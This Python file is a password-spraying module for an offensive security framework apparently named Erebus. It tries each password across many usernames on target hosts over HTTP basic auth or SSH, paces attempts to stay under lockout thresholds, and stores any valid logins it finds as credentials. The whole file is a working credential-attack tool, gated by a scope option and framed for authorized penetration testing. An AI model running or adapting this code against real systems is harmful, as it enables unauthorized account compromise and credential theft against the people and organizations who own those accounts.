"""Password-spray in-scope hosts (active, scope-gated via RHOSTS).

Tries ONE password across every user before moving to the next password, with a
delay between rounds, to stay under account-lockout thresholds. Backends: http-basic
(stdlib, default) and ssh (needs paramiko). Valid logins are recorded as credentials
(the secret is stored but never emitted over the API). Module: auxiliary/creds/spray.
"""
from __future__ import annotations

from erebus.core.module_base import Auxiliary, Rank
from erebus.core.options import OptionSpec
from erebus.lib import credattack as ca
from erebus.modules.auxiliary.scanner.portscan import expand_hosts


class Spray(Auxiliary):
    name = "creds/spray"
    description = "Password-spray in-scope hosts (lockout-safe; http-basic/ssh)"
    authors = ["Erebus"]
    references = []
    attack = ["T1110.003"]  # Brute Force: Password Spraying
    rank = Rank.NORMAL
    options = [
        OptionSpec("RHOSTS", required=True, kind="string",
                   desc="target host(s)/CIDR (scope-gated)"),
        OptionSpec("USERS", required=True, kind="string",
                   desc="usernames, comma/space separated"),
        OptionSpec("PASSWORDS", required=True, kind="string",
                   desc="password(s) to spray, comma/space separated"),
        OptionSpec("SERVICE", default="http-basic", kind="enum",
                   choices=["http-basic", "ssh"], desc="auth backend"),
        OptionSpec("PORT", default=0, kind="int", desc="service port (0 = default)"),
        OptionSpec("SCHEME", default="http", kind="enum", choices=["http", "https"],
                   desc="http-basic scheme"),
        OptionSpec("PATH", default="/", kind="string", desc="http-basic protected path"),
        OptionSpec("DELAY", default=1.0, kind="float",
                   desc="seconds between spray rounds (lockout safety)"),
        OptionSpec("TIMEOUT", default=6.0, kind="float", desc="per-attempt timeout (s)"),
    ]

    def _attempt(self) -> ca.Attempt:
        service = str(self.opt("SERVICE", "http-basic"))
        timeout = float(str(self.opt("TIMEOUT", 6.0)))
        if service == "ssh":
            return lambda h, p, u, s: ca.ssh_attempt(h, p or 22, u, s, timeout=timeout)
        scheme = str(self.opt("SCHEME", "http"))
        path = str(self.opt("PATH", "/"))
        return lambda h, p, u, s: ca.http_basic_attempt(
            h, p or (443 if scheme == "https" else 80), u, s,
            scheme=scheme, path=path, timeout=timeout)

    def run(self) -> None:
        hosts = expand_hosts(str(self.opt("RHOSTS", "")))
        users = ca.parse_list(self.opt("USERS"))
        passwords = ca.parse_list(self.opt("PASSWORDS"))
        if not hosts or not users or not passwords:
            self.error("need RHOSTS, USERS and PASSWORDS")
            return
        service = str(self.opt("SERVICE", "http-basic"))
        port = int(str(self.opt("PORT", 0)))
        delay = float(str(self.opt("DELAY", 1.0)))
        self.info_(f"spraying {len(passwords)} password(s) x {len(users)} user(s) "
                   f"across {len(hosts)} host(s) via {service} (delay {delay}s)")
        try:
            hits = ca.spray(hosts, users, passwords, self._attempt(),
                            port=port, delay=delay)
        except ca.CredAttackError as exc:
            self.error(str(exc))
            return
        for h in hits:
            self.good(f"valid login: {h['username']}@{h['host']} ({service})")
            self.add_credential(h["host"], h["username"], secret=h["secret"],
                                kind="password", service=service,
                                port=h.get("port") or 0)
        self.info_(f"done: {len(hits)} valid login(s) found")
